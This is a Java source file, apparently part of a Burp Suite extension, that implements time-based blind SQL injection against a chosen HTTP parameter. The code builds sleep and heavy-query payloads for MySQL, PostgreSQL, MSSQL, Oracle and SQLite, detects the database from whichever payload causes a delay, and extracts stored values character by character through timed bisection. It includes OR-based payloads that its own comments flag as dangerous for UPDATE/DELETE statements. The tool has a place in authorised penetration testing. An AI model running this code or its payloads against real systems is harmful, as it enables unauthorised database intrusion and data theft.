package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Time-based blind SQL injection extractor for OmniMap.
 * All payloads taken directly from sqlmap's data/xml/payloads/time_blind.xml.
 *
 * CRITICAL FIX: Detection tries ALL DBMS sleep functions (not just the detected DBMS).
 * This handles the case where DBMS detection defaults to MySQL but the target is
 * actually PostgreSQL/MSSQL/Oracle/SQLite. Like sqlmap: time_blind.xml contains
 * payloads for ALL DBMS, and the successful payload identifies the DBMS.
 *
 * sqlmap reference payloads:
 * - MySQL:      AND (SELECT ri FROM (SELECT(SLEEP(delay-(IF(cond,0,delay)))))rs)       [test #1, L1R1]
 * - MySQL:      AND ri=IF(cond,SLEEP(delay),ri)                                        [test #3, L2R1]
 * - MySQL:      RLIKE (SELECT ri FROM (SELECT(SLEEP(delay-(IF(cond,0,delay)))))rs)      [test line 336, L2R1]
 * - MySQL:      AND ELT(cond,SLEEP(delay))                                             [test line 417, L3R1]
 * - MySQL:      AND ri=BENCHMARK(delay000000,MD5(hex))                                 [test #9, L2R2]
 * - PostgreSQL: AND ri=(CASE WHEN (cond) THEN (SELECT ri FROM PG_SLEEP(delay)) ELSE ri END)  [test line 497, L1R1]
 * - PostgreSQL: AND ri=(SELECT COUNT(*) FROM GENERATE_SERIES(1,delay000000))            [test line 578, L2R2]
 * - MSSQL:      IF(cond) WAITFOR DELAY '0:0:delay'                                     [test line 657, L1R1]
 * - MSSQL:      AND ri=(SELECT COUNT(*) FROM sysusers AS t1,...,t7)                     [test line 698, L2R2]
 * - Oracle:     AND ri=(CASE WHEN (cond) THEN DBMS_PIPE.RECEIVE_MESSAGE(str,delay) ELSE ri END)  [test line 780, L1R1]
 * - Oracle:     AND ri=DBMS_LOCK.SLEEP(delay)                                          [L3R1]
 * - Oracle:     AND ri=(SELECT COUNT(*) FROM ALL_USERS t1,...,t5)                       [test line 857, L2R2]
 * - SQLite:     AND ri=(CASE WHEN (cond) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(delay00000000/2)))) ELSE ri END)  [test line 1013, L3R2]
 */
public class TimeExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private volatile boolean cancelled = false;

    /** Measured baseline response time (average of multiple samples) */
    private long baselineTimeMs = 0;

    /** Adaptive delay in seconds */
    private int currentDelay;

    /** Which payload type worked during detection (used for extraction dispatch) */
    private String workingPayloadType = "AND-sleep";

    /** Which DBMS the successful time payload identified (may differ from engine's dialect) */
    private String detectedDbms = null;

    /** The boundary (prefix/suffix) that works for time-based extraction */
    private String workingPrefix = "";
    private String workingSuffix = "";

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    public TimeExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                         OmniMapCallback callback, OmniMapResult result,
                         HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;
        this.currentDelay = config.getTimeDelay();

        // Initialize working boundary from config (fallback if detect() not called)
        this.workingPrefix = config.getPrefix();
        this.workingSuffix = config.getSuffix();
    }

    public void cancel() { this.cancelled = true; }

    /** Returns the DBMS identified by the successful time payload (may differ from engine's dialect) */
    public String getDetectedDbms() { return detectedDbms; }

    /**
     * Test if time-based injection works by trying ALL DBMS × boundary × payload combinations.
     * Like sqlmap: time_blind.xml contains payloads for ALL DBMS types. The successful
     * payload identifies the DBMS (stored in detectedDbms for engine feedback).
     *
     * Validation (like sqlmap):
     * 1. Response must be delayed (above threshold)
     * 2. Second request must also be delayed (consistency check)
     * 3. Zero-delay payload must NOT be delayed (causality check — like sqlmap's SLEEP(0) validation)
     *
     * @param boundaries list of {prefix, suffix} pairs to try
     * @return true if time-based injection is viable
     */
    public boolean detect(List<String[]> boundaries) {
        callback.onProgress("TIME: Measuring baseline response time...", 5);

        int level = config.getLevel();
        int risk = config.getRisk();

        // Measure baseline (average of 3 samples for stability)
        long totalBaseline = 0;
        int baselineSamples = 3;
        for (int i = 0; i < baselineSamples && !cancelled; i++) {
            long start = System.currentTimeMillis();
            var resp = sendPayloadRaw("");
            long elapsed = System.currentTimeMillis() - start;
            if (resp == null) return false;
            totalBaseline += elapsed;
        }
        baselineTimeMs = totalBaseline / baselineSamples;
        if (cancelled) return false;

        callback.onProgress("TIME: Baseline=" + baselineTimeMs + "ms (avg of " + baselineSamples + "). Testing delay...", 8);

        // Adapt delay if server is slow (like sqlmap)
        if (baselineTimeMs > 3000) {
            currentDelay = Math.max(currentDelay, (int) (baselineTimeMs / 1000) + 3);
        }

        // Build ALL DBMS time payloads — exact sqlmap format from time_blind.xml
        // Each entry: {payload, label, dbmsName}
        List<String[]> payloads = buildAllDetectionPayloads(level, risk);

        // Expand boundaries: for each boundary with non-empty suffix, also try without suffix
        List<String[]> expandedBoundaries = new ArrayList<>();
        for (String[] b : boundaries) {
            expandedBoundaries.add(b);
            if (!b[1].isEmpty()) {
                expandedBoundaries.add(new String[]{b[0], ""});
            }
        }

        int totalCombos = expandedBoundaries.size() * payloads.size();
        int tried = 0;

        // Try ALL boundary × payload combinations
        for (String[] boundary : expandedBoundaries) {
            String prefix = boundary[0];
            String suffix = boundary[1];

            for (String[] entry : payloads) {
                if (cancelled) return false;
                tried++;

                String payload = TamperEngine.apply(entry[0], config.getTampers());
                String label = entry[1];
                String dbms = entry[2];

                long responseTime = measureResponseTimeWith(payload, prefix, suffix);
                if (cancelled) return false;

                boolean delayed = isDelayed(responseTime);
                if (!delayed) continue;

                // Validation 1: Repeat to confirm consistency (like sqlmap)
                responseTime = measureResponseTimeWith(payload, prefix, suffix);
                delayed = isDelayed(responseTime);
                if (!delayed) continue;

                // Validation 2: Zero-sleep check (like sqlmap's reqPayload.replace(SLEEP_TIME_MARKER, "0"))
                // Send same payload structure with 0 delay — should NOT be delayed
                String zeroPayload = buildZeroDelayPayload(label, dbms);
                if (zeroPayload != null) {
                    zeroPayload = TamperEngine.apply(zeroPayload, config.getTampers());
                    long zeroTime = measureResponseTimeWith(zeroPayload, prefix, suffix);
                    if (isDelayed(zeroTime)) {
                        // False positive — server is slow regardless of delay value
                        continue;
                    }
                }

                // SUCCESS — store working configuration
                workingPayloadType = label;
                workingPrefix = prefix;
                workingSuffix = suffix;
                detectedDbms = dbms;
                callback.onProgress("TIME: Confirmed! " + label + " (" + dbms + ") prefix=\"" + prefix +
                        "\" suffix=\"" + suffix + "\" delay=" + currentDelay +
                        "s [" + tried + "/" + totalCombos + "]", 10);
                return true;
            }
        }

        callback.onProgress("TIME: No delay detected after " + tried + " attempts", 0);
        return false;
    }

    /**
     * Build ALL DBMS detection payloads — exact sqlmap time_blind.xml format.
     * Prioritizes the engine's current dialect first for faster detection when DBMS is known.
     * Each entry: {detectionPayload, label, dbmsName}
     */
    private List<String[]> buildAllDetectionPayloads(int level, int risk) {
        List<String[]> payloads = new ArrayList<>();
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String rs = "a" + ThreadLocalRandom.current().nextInt(1000, 10000);
        String currentDbms = dialect.getName();

        // Helper: order DBMS list with current dialect first for priority
        String[] allDbms = reorderDbms(currentDbms);

        // === Level 1, Risk 1: Native sleep for ALL DBMS ===
        for (String dbms : allDbms) {
            payloads.add(new String[]{buildDetectionSleep(dbms, ri, rs), "AND-sleep", dbms});
        }

        // === Level 2+: MySQL-specific variants ===
        if (level >= 2) {
            // MySQL: AND ri=IF(1=1,SLEEP(delay),ri)  [sqlmap test #3, L2R1]
            payloads.add(new String[]{
                    " AND " + ri + "=IF(1=1,SLEEP(" + currentDelay + ")," + ri + ") ",
                    "AND-IF-direct", "MySQL"});

            // MySQL RLIKE: RLIKE (SELECT ri FROM (SELECT(SLEEP(delay)))rs)  [sqlmap test line 336, L2R1]
            payloads.add(new String[]{
                    " RLIKE (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + ")))" + rs + ") ",
                    "RLIKE-sleep", "MySQL"});
        }

        // === Level 3+: MySQL ELT + Oracle DBMS_LOCK ===
        if (level >= 3) {
            // MySQL: AND ELT(1=1,SLEEP(delay))  [sqlmap test line 417, L3R1]
            payloads.add(new String[]{
                    " AND ELT(1=1,SLEEP(" + currentDelay + ")) ",
                    "AND-ELT-sleep", "MySQL"});

            // MySQL: AND MAKE_SET(1=1,SLEEP(delay))  [sqlmap parameter-replace variant]
            payloads.add(new String[]{
                    " AND MAKE_SET(1=1,SLEEP(" + currentDelay + ")) ",
                    "AND-MAKE_SET-sleep", "MySQL"});

            // Oracle: AND ri=DBMS_LOCK.SLEEP(delay)  [sqlmap L3R1]
            payloads.add(new String[]{
                    " AND " + ri + "=DBMS_LOCK.SLEEP(" + currentDelay + ") ",
                    "AND-DBMS_LOCK", "Oracle"});

            // SQLite at L3R2 (if not already added — SQLite sleep IS heavy query)
            payloads.add(new String[]{
                    " AND " + ri + "=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + currentDelay + "00000000/2)))) ",
                    "AND-sleep", "SQLite"});
        }

        // === Risk 2: Heavy queries for ALL DBMS ===
        if (risk >= 2) {
            // MySQL: AND ri=BENCHMARK(delay000000,MD5(hex))  [sqlmap test #9, L2R2]
            payloads.add(new String[]{
                    " AND " + ri + "=BENCHMARK(" + currentDelay + "000000,MD5(0x" + String.format("%04x", ri) + ")) ",
                    "AND-BENCHMARK", "MySQL"});

            // PostgreSQL: AND ri=(SELECT COUNT(*) FROM GENERATE_SERIES(1,delay000000))  [sqlmap test line 578, L2R2]
            payloads.add(new String[]{
                    " AND " + ri + "=(SELECT COUNT(*) FROM GENERATE_SERIES(1," + currentDelay + "000000)) ",
                    "AND-heavy-query", "PostgreSQL"});

            // MSSQL: AND ri=(SELECT COUNT(*) FROM sysusers AS t1,...,t7)  [sqlmap test line 698, L2R2]
            payloads.add(new String[]{
                    " AND " + ri + "=(SELECT COUNT(*) FROM sysusers AS t1,sysusers AS t2,sysusers AS t3,sysusers AS t4,sysusers AS t5,sysusers AS t6,sysusers AS t7) ",
                    "AND-heavy-query", "MSSQL"});

            // Oracle: AND ri=(SELECT COUNT(*) FROM ALL_USERS t1,...,t5)  [sqlmap test line 857, L2R2]
            payloads.add(new String[]{
                    " AND " + ri + "=(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5) ",
                    "AND-heavy-query", "Oracle"});
        }

        // === Risk 3: OR-based (dangerous for UPDATE/DELETE!) ===
        if (risk >= 3) {
            for (String dbms : allDbms) {
                // OR sleep variants  [sqlmap: OR versions of each AND payload]
                payloads.add(new String[]{buildDetectionOrSleep(dbms, ri, rs), "OR-sleep", dbms});
            }

            // OR heavy query variants
            payloads.add(new String[]{
                    " OR " + ri + "=BENCHMARK(" + currentDelay + "000000,MD5(0x" + String.format("%04x", ri) + ")) ",
                    "OR-heavy-query", "MySQL"});
            payloads.add(new String[]{
                    " OR " + ri + "=(SELECT COUNT(*) FROM GENERATE_SERIES(1," + currentDelay + "000000)) ",
                    "OR-heavy-query", "PostgreSQL"});
            payloads.add(new String[]{
                    " OR " + ri + "=(SELECT COUNT(*) FROM sysusers AS t1,sysusers AS t2,sysusers AS t3,sysusers AS t4,sysusers AS t5,sysusers AS t6,sysusers AS t7) ",
                    "OR-heavy-query", "MSSQL"});
            payloads.add(new String[]{
                    " OR " + ri + "=(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5) ",
                    "OR-heavy-query", "Oracle"});
        }

        return payloads;
    }

    /**
     * Build detection sleep payload (unconditional) for a specific DBMS.
     * These are the exact payloads from sqlmap's time_blind.xml <request> tags.
     */
    private String buildDetectionSleep(String dbms, int ri, String rs) {
        return switch (dbms) {
            // sqlmap test #1: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
            case "MySQL" -> " AND (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + ")))" + rs + ") ";
            // sqlmap test line 497: AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
            case "PostgreSQL" -> " AND " + ri + "=(SELECT " + ri + " FROM PG_SLEEP(" + currentDelay + ")) ";
            // sqlmap test line 657: WAITFOR DELAY '0:0:[SLEEPTIME]'
            case "MSSQL" -> " WAITFOR DELAY '0:0:" + currentDelay + "' ";
            // sqlmap test line 780: AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
            case "Oracle" -> " AND " + ri + "=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)," + currentDelay + ") ";
            // sqlmap test line 1013: AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
            case "SQLite" -> " AND " + ri + "=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + currentDelay + "00000000/2)))) ";
            default -> " AND (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + ")))" + rs + ") ";
        };
    }

    /**
     * Build OR-based detection sleep payload for a specific DBMS.
     * sqlmap: OR versions of each AND payload at Risk 3.
     */
    private String buildDetectionOrSleep(String dbms, int ri, String rs) {
        return switch (dbms) {
            case "MySQL" -> " OR (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + ")))" + rs + ") ";
            case "PostgreSQL" -> " OR " + ri + "=(SELECT " + ri + " FROM PG_SLEEP(" + currentDelay + ")) ";
            case "MSSQL" -> " WAITFOR DELAY '0:0:" + currentDelay + "' "; // Statement-level, same for OR
            case "Oracle" -> " OR " + ri + "=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)," + currentDelay + ") ";
            case "SQLite" -> " OR " + ri + "=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + currentDelay + "00000000/2)))) ";
            default -> " OR (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + ")))" + rs + ") ";
        };
    }

    /**
     * Build a zero-delay version of a payload for false-positive validation.
     * Like sqlmap: reqPayload.replace(SLEEP_TIME_MARKER, "0").
     * If the zero-delay payload is ALSO delayed, it's a false positive (server lag).
     */
    private String buildZeroDelayPayload(String label, String dbms) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String rs = "a" + ThreadLocalRandom.current().nextInt(1000, 10000);

        if (label.contains("heavy") || label.contains("BENCHMARK")) {
            // Heavy queries with 0 iterations are instant — no need to validate
            return null;
        }

        if (label.equals("AND-sleep") || label.equals("OR-sleep")) {
            String prefix = label.startsWith("OR") ? " OR " : " AND ";
            return switch (dbms) {
                case "MySQL" -> prefix + "(SELECT " + ri + " FROM (SELECT(SLEEP(0)))" + rs + ") ";
                case "PostgreSQL" -> prefix + ri + "=(SELECT " + ri + " FROM PG_SLEEP(0)) ";
                case "MSSQL" -> " WAITFOR DELAY '0:0:0' ";
                case "Oracle" -> prefix + ri + "=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),0) ";
                case "SQLite" -> null; // SQLite uses CPU-bound, 0 = instant
                default -> null;
            };
        } else if ("AND-IF-direct".equals(label)) {
            return " AND " + ri + "=IF(1=1,SLEEP(0)," + ri + ") ";
        } else if ("RLIKE-sleep".equals(label)) {
            return " RLIKE (SELECT " + ri + " FROM (SELECT(SLEEP(0)))" + rs + ") ";
        } else if ("AND-ELT-sleep".equals(label)) {
            return " AND ELT(1=1,SLEEP(0)) ";
        } else if ("AND-MAKE_SET-sleep".equals(label)) {
            return " AND MAKE_SET(1=1,SLEEP(0)) ";
        } else if ("AND-DBMS_LOCK".equals(label)) {
            return " AND " + ri + "=DBMS_LOCK.SLEEP(0) ";
        }
        return null;
    }

    /** Reorder DBMS list with current dialect first for priority. */
    private String[] reorderDbms(String currentDbms) {
        String[] all = {"MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"};
        List<String> ordered = new ArrayList<>();
        ordered.add(currentDbms);
        for (String d : all) {
            if (!d.equals(currentDbms)) ordered.add(d);
        }
        return ordered.toArray(new String[0]);
    }

    /**
     * Check if a response time indicates a delay.
     * Uses max(500ms, 75% of expected delay) as threshold — like sqlmap's MIN_VALID_DELAYED_RESPONSE.
     */
    private boolean isDelayed(long responseTimeMs) {
        long delta = responseTimeMs - baselineTimeMs;
        long threshold = Math.max(500, (long) (currentDelay * 1000 * 0.75));
        return delta >= threshold;
    }

    // ==================== Extraction ====================

    /**
     * Extract a single string value using time-based blind bisection.
     * Single-threaded (like sqlmap — concurrent SLEEP causes false positives).
     */
    public String extractSingle(String query) {
        if (cancelled) return null;

        int length = extractLength(query);
        if (length <= 0 || cancelled) return null;

        callback.onProgress("TIME: Extracting " + length + " chars...", 20);

        // Single-threaded for time-based (like sqlmap)
        char[] chars = new char[length];
        for (int pos = 1; pos <= length && !cancelled; pos++) {
            int ascii = extractCharAtPosition(query, pos);
            if (ascii > 0) {
                chars[pos - 1] = (char) ascii;
            } else {
                chars[pos - 1] = '?';
            }
        }

        return new String(chars).trim();
    }

    /**
     * Extract a list of values with dedup.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        Set<String> seen = new HashSet<>();
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            String trimmed = val.trim();
            if (seen.add(trimmed)) {
                results.add(trimmed);
                callback.onProgress("TIME: Extracted " + results.size() + " values...",
                        Math.min(90, 20 + results.size() * 5));
            }
        }

        return results;
    }

    /**
     * Extract string length using binary search with time-based detection.
     */
    private int extractLength(String query) {
        String dbms = detectedDbms != null ? detectedDbms : dialect.getName();
        String lengthExpr = buildLengthExpr(query, dbms);
        int low = 0, high = 64;

        // Find upper bound
        while (!cancelled) {
            if (testTimedCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 1024) return -1;
            } else {
                break;
            }
        }

        // Binary search
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        return low;
    }

    /** Build LENGTH expression for the detected DBMS */
    private String buildLengthExpr(String query, String dbms) {
        return switch (dbms) {
            case "MSSQL" -> "LEN((" + query + "))";
            default -> "LENGTH((" + query + "))";
        };
    }

    /**
     * Extract ASCII value at a position using tiered adaptive bisection.
     * Tier 1: lowercase a-z (97-122) — 5-6 steps
     * Tier 2: digits 0-9 (48-57) — 4-5 steps
     * Tier 3: full ASCII (32-126) — 7 steps
     */
    private int extractCharAtPosition(String query, int position) {
        String dbms = detectedDbms != null ? detectedDbms : dialect.getName();
        String asciiExpr = buildAsciiExpr(query, position, dbms);

        // Tier 1: lowercase letters (most common in DB names/values)
        int result = bisectInRange(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRange(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII
        return bisectFull(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    /** Build ASCII-at-position expression for the detected DBMS */
    private String buildAsciiExpr(String query, int position, String dbms) {
        String substr = switch (dbms) {
            case "MySQL" -> "MID((" + query + ")," + position + ",1)";
            case "Oracle" -> "SUBSTR((" + query + ")," + position + ",1)";
            case "SQLite" -> "SUBSTR((" + query + ")," + position + ",1)";
            default -> "SUBSTRING((" + query + ")," + position + ",1)";
        };
        return switch (dbms) {
            case "MySQL" -> "ORD(" + substr + ")";
            default -> "ASCII(" + substr + ")";
        };
    }

    /**
     * Check if the ASCII value is within [low, high] and bisect if so.
     */
    private int bisectInRange(String asciiExpr, int low, int high) {
        if (!testTimedCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFull(asciiExpr, low, high);
    }

    /**
     * Binary search bisection using time-based detection.
     */
    private int bisectFull(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a condition using time-based injection.
     * Dispatches to the correct payload format based on detectedDbms and workingPayloadType.
     * CRITICAL: must use the same DBMS format that worked during detection.
     */
    private boolean testTimedCondition(String condition) {
        String dbms = detectedDbms != null ? detectedDbms : dialect.getName();
        String payload;

        if (workingPayloadType.startsWith("OR-")) {
            if (workingPayloadType.contains("heavy")) {
                payload = buildHeavyConditional(condition, dbms, "OR");
            } else {
                payload = buildSleepConditional(condition, dbms, "OR");
            }
        } else if (workingPayloadType.contains("BENCHMARK") || workingPayloadType.contains("heavy")) {
            payload = buildHeavyConditional(condition, dbms, "AND");
        } else if (workingPayloadType.contains("ELT")) {
            // sqlmap: AND ELT([INFERENCE],SLEEP([SLEEPTIME]))
            payload = " AND ELT(" + condition + ",SLEEP(" + currentDelay + ")) ";
        } else if (workingPayloadType.contains("MAKE_SET")) {
            // sqlmap: MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))
            payload = " AND MAKE_SET(" + condition + ",SLEEP(" + currentDelay + ")) ";
        } else if (workingPayloadType.contains("RLIKE")) {
            // sqlmap: RLIKE (SELECT ri FROM (SELECT(SLEEP(delay-(IF(cond,0,delay)))))rs)
            int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
            String rs = "a" + ThreadLocalRandom.current().nextInt(1000, 10000);
            payload = " RLIKE (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay +
                    "-(IF((" + condition + "),0," + currentDelay + ")))))" + rs + ") ";
        } else if (workingPayloadType.contains("IF-direct")) {
            // sqlmap: AND ri=IF(cond,SLEEP(delay),ri)
            int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
            payload = " AND " + ri + "=IF((" + condition + "),SLEEP(" + currentDelay + ")," + ri + ") ";
        } else if (workingPayloadType.contains("DBMS_LOCK")) {
            // Oracle DBMS_LOCK.SLEEP
            int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
            payload = " AND " + ri + "=(CASE WHEN (" + condition + ") THEN DBMS_LOCK.SLEEP(" +
                    currentDelay + ") ELSE " + ri + " END) ";
        } else {
            // AND-sleep: native sleep conditional — exact sqlmap vector format
            payload = buildSleepConditional(condition, dbms, "AND");
        }

        payload = TamperEngine.apply(payload, config.getTampers());
        long responseTime = measureResponseTime(payload);
        return isDelayed(responseTime);
    }

    /**
     * Build native sleep conditional payload — exact sqlmap <vector> format.
     *
     * MySQL:      AND (SELECT ri FROM (SELECT(SLEEP(delay-(IF(cond,0,delay)))))rs)
     * PostgreSQL: AND ri=(CASE WHEN (cond) THEN (SELECT ri FROM PG_SLEEP(delay)) ELSE ri END)
     * MSSQL:      IF(cond) WAITFOR DELAY '0:0:delay'
     * Oracle:     AND ri=(CASE WHEN (cond) THEN DBMS_PIPE.RECEIVE_MESSAGE(str,delay) ELSE ri END)
     * SQLite:     AND ri=(CASE WHEN (cond) THEN LIKE('ABCDEFG',...) ELSE ri END)
     */
    private String buildSleepConditional(String condition, String dbms, String operator) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String rs = "a" + ThreadLocalRandom.current().nextInt(1000, 10000);
        String op = " " + operator + " ";

        return switch (dbms) {
            case "MySQL" -> op + "(SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay +
                    "-(IF((" + condition + "),0," + currentDelay + ")))))" + rs + ") ";
            case "PostgreSQL" -> op + ri + "=(CASE WHEN (" + condition + ") THEN (SELECT " +
                    ri + " FROM PG_SLEEP(" + currentDelay + ")) ELSE " + ri + " END) ";
            case "MSSQL" -> " IF((" + condition + ")) WAITFOR DELAY '0:0:" + currentDelay + "' ";
            case "Oracle" -> op + ri + "=(CASE WHEN (" + condition + ") THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)," +
                    currentDelay + ") ELSE " + ri + " END) ";
            case "SQLite" -> op + ri + "=(CASE WHEN (" + condition + ") THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" +
                    currentDelay + "00000000/2)))) ELSE " + ri + " END) ";
            default -> op + "(SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay +
                    "-(IF((" + condition + "),0," + currentDelay + ")))))" + rs + ") ";
        };
    }

    /**
     * Build heavy query conditional payload — exact sqlmap format.
     *
     * MySQL:      AND ri=IF(cond,BENCHMARK(delay000000,MD5(hex)),ri)
     * PostgreSQL: AND ri=(CASE WHEN (cond) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,delay000000)) ELSE ri END)
     * MSSQL:      AND ri=(CASE WHEN (cond) THEN (SELECT COUNT(*) FROM sysusers AS t1,...,t7) ELSE ri END)
     * Oracle:     AND ri=(CASE WHEN (cond) THEN (SELECT COUNT(*) FROM ALL_USERS t1,...,t5) ELSE ri END)
     * SQLite:     AND ri=(CASE WHEN (cond) THEN LIKE(...) ELSE ri END)
     */
    private String buildHeavyConditional(String condition, String dbms, String operator) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String op = " " + operator + " ";

        if ("MySQL".equals(dbms)) {
            return op + ri + "=IF((" + condition + "),BENCHMARK(" + currentDelay +
                    "000000,MD5(0x" + String.format("%04x", ri) + "))," + ri + ") ";
        }

        String heavyExpr = switch (dbms) {
            case "PostgreSQL" -> "(SELECT COUNT(*) FROM GENERATE_SERIES(1," + currentDelay + "000000))";
            case "MSSQL" -> "(SELECT COUNT(*) FROM sysusers AS t1,sysusers AS t2,sysusers AS t3,sysusers AS t4,sysusers AS t5,sysusers AS t6,sysusers AS t7)";
            case "Oracle" -> "(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5)";
            case "SQLite" -> "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + currentDelay + "00000000/2))))";
            default -> "BENCHMARK(" + currentDelay + "000000,MD5(0x" + String.format("%04x", ri) + "))";
        };

        return op + ri + "=(CASE WHEN (" + condition + ") THEN " + heavyExpr + " ELSE " + ri + " END) ";
    }

    // ==================== Request Helpers ====================

    private long measureResponseTime(String payload) {
        long start = System.currentTimeMillis();
        sendPayload(payload);
        return System.currentTimeMillis() - start;
    }

    private long measureResponseTimeWith(String payload, String prefix, String suffix) {
        long start = System.currentTimeMillis();
        sendPayloadWith(payload, prefix, suffix);
        return System.currentTimeMillis() - start;
    }

    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        return sendPayloadWith(payload, workingPrefix, workingSuffix);
    }

    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadWith(
            String payload, String prefix, String suffix) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    prefix + payload + (suffix.isEmpty() ? "" : suffix));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "TIME", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadRaw(String payload) {
        try {
            HttpRequest req = payload.isEmpty() ? originalRequest.request()
                    : PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), payload);
            HttpRequestResponse rr = api.http().sendRequest(req);
            result.incrementRequestCount();
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }
}
